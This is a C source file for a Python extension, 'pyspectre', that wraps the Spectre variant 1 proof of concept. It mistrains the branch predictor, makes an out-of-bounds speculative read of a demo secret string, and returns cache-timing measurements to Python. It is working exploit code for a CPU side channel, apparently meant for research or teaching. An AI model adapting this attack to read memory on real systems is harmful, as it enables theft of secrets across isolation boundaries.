/* https://spectreattack.com/spectre.pdf */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

#include <Python.h>

/********************************************************************
  Victim code.
 ********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
uint8_t unused2[64];
uint8_t array2[256 * 512];

/* String of the most common ASCII (<128) chars. */
char *trainer = "\t\n\r !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~";
char *secret = "The Magic Words are Squeamish Ossifrage.";


uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */

void victim_function(size_t x) {
    if (x < array1_size) {
        temp &= array2[array1[x] * 512];
    }
}

/********************************************************************
  Analysis code
 ********************************************************************/
#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint64_t timings[256]) {
    static int results[256];
    int i, j, mix_i;
    unsigned int junk = 0;
    size_t training_x, x;
    register uint64_t time1, time2;
    volatile uint8_t *addr;
    for (i = 0; i < 256; i++) {
        results[i] = 0;
    }
    /* Flush array2[256*(0..255)] from cache */
    for (i = 0; i < 256; i++) {
        _mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */
    }
    /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
    training_x = 0; // always train on in range index to array1
    for (j = 29; j >= 0; j--) {
        _mm_clflush(&array1_size);
        for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */
        
        /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
        /* Avoid jumps in case those tip off the branch predictor */
        x = ((j % 6) - 1) & ~0xFFFF;
        /* Set x=FFF.FF0000 if j%6==0, else x=0 */
        x = (x | (x >> 16));
        /* Set x=-1 if j&6=0, else x=0 */
        x = training_x ^ (x & (malicious_x ^ training_x));
        
        /* Call the victim! */
        victim_function(x);
    }
    
    /* Time reads. Order is lightly mixed up to prevent stride prediction */
    for (i = 0; i < 256; i++) {
        mix_i = ((i * 167) + 13) & 255;
        addr = &array2[mix_i * 512];
        time1 = __rdtscp(&junk);         /* READ TIMER */
        junk = *addr;                    /* MEMORY ACCESS TO TIME */
        time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
        timings[mix_i] = time2;
    }
    
    results[0] ^= junk; /* use junk so code above won’t get optimized out*/
}


/* Allows us to call readMemoryByte from python */
static PyObject* readMemoryBytePy(PyObject* self, PyObject *args) {
    size_t malicious_x;
    int use_trainer;
    uint64_t timings[256];
    uint32_t i;
    uint32_t position = 0;
    for (i = 0; i < sizeof(array2); i++) {
        array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
    }

    PyArg_ParseTuple(args, "ip", &position, &use_trainer);
    if (use_trainer)
        malicious_x = (size_t)(trainer-(char*)array1);
    else
        malicious_x = (size_t)(secret-(char*)array1);

    readMemoryByte(malicious_x + position, timings);

    PyObject *pyTimings = PyList_New(256);
    for (i = 0; i < 256; i++) {
        PyList_SetItem(pyTimings, i, PyLong_FromLong(timings[i]));
    }
  
    return pyTimings;
}

static PyObject* getTrainerStr(PyObject* self, PyObject *args) {
    return PyUnicode_FromFormat("%s", trainer);
}

/* Declaration of methods we can call from Python */
static PyMethodDef PySpectreMethods[] = {
    { "readMemoryByte", readMemoryBytePy, METH_VARARGS, NULL },
    { "getTrainerStr", getTrainerStr, METH_NOARGS, NULL },
    { NULL, NULL, 0, NULL }
};

/* Declaration of this module */
static struct PyModuleDef PySpectreModule = {
    PyModuleDef_HEAD_INIT, "pyspectre",   NULL, -1, PySpectreMethods
};

/* Initialization function */
PyMODINIT_FUNC 
PyInit_pyspectre(void) {
    return PyModule_Create(&PySpectreModule);
}